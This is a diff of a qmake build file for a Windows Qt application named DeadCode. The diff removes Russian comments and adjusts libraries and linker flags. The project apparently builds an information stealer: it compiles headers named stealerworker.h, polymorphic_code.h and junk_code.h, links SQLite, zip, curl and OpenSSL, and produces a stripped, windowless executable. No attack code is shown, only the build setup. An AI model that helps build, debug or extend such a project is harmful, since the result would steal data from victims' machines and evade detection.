@@ -1,17 +1,12 @@
-# Основные модули Qt
 QT += core gui network widgets
 
-# Имя целевого исполняемого файла
 TARGET = DeadCode
-# Тип проекта — приложение
 TEMPLATE = app
 
-# Исходные файлы (.cpp)
 SOURCES += \
     ../src/main.cpp \
     mainwindow.cpp
 
-# Заголовочные файлы (.h)
 HEADERS += \
     mainwindow.h \
     ../src/build_key.h \
@@ -19,26 +14,20 @@ HEADERS += \
     ../src/junk_code.h \
     ../src/stealerworker.h
 
-# Файлы интерфейса (.ui)
-FORMS += \
-    mainwindow.ui
+FORMS += mainwindow.ui
 
-# Ресурсы (иконка)
 RC_ICONS = ../icon.ico
 
-# Пути для поиска заголовочных файлов
 INCLUDEPATH += \
     ../src \
     . \
     C:/vcpkg/installed/x64-mingw-static/include
 
-# Библиотеки (vcpkg и системные Windows-библиотеки)
-# Убедись, что все библиотеки установлены через vcpkg: sqlite3, libzip, zlib, curl, openssl
 LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
         -lsqlite3 \
         -lzip \
-        -lzlib \
-        -lbz2 \
+        -lz \
+        -lbzip2 \
         -lcurl \
         -lssl \
         -lcrypto \
@@ -57,7 +46,6 @@ LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
         -lurlmon \
         -lole32
 
-# Флаги компиляции
 QMAKE_CXXFLAGS += -O2 \
                   -std=c++17 \
                   -Wall \
@@ -72,10 +60,8 @@ QMAKE_CXXFLAGS += -O2 \
                   -Wno-deprecated-declarations \
                   -Wno-cast-function-type
 
-# Флаги линковки (исправлено!)
-QMAKE_LFLAGS = -static -O2 -Wl,-s -Wl,-subsystem,windows -mthreads
+QMAKE_LFLAGS = -static-libgcc -static-libstdc++ -O2 -Wl,-s -Wl,-subsystem,windows -mthreads
 
-# Определения для сборки (добавляем дату сборки и версию из git)
 BUILD_DATE = $$system(powershell -Command "Get-Date -Format 'yyyy-MM-dd'")
 isEmpty(BUILD_DATE) {
     BUILD_DATE = "unknown"
@@ -87,31 +73,22 @@ isEmpty(BUILD_VERSION) {
 DEFINES += BUILD_DATE=\\\"$${BUILD_DATE}\\\" \
            BUILD_VERSION=\\\"$${BUILD_VERSION}\\\"
 
-# Директории для выходных файлов
 DESTDIR = ../build
 OBJECTS_DIR = ../Release
 MOC_DIR = ../Release
 UI_DIR = ../Release
 
-# Очистка
 QMAKE_CLEAN += \
     ../build/DeadCode.exe \
-    ../Release/*.o \
-    ../Release/*.cpp \
-    ../Release/*.h
+    ../Release/*.o
 
-# Дополнительные проверки и зависимости для Windows
 win32 {
     CONFIG(debug, debug|release) {
         QMAKE_CXXFLAGS += -g
         QMAKE_LFLAGS -= -O2
-    } else {
-        QMAKE_CXXFLAGS += -O2
-        QMAKE_LFLAGS += -O2
     }
 }
 
-# Пользовательские шаги сборки для зависимостей
 PRE_TARGETDEPS += \
     ../src/build_key.h \
     ../src/polymorphic_code.h \
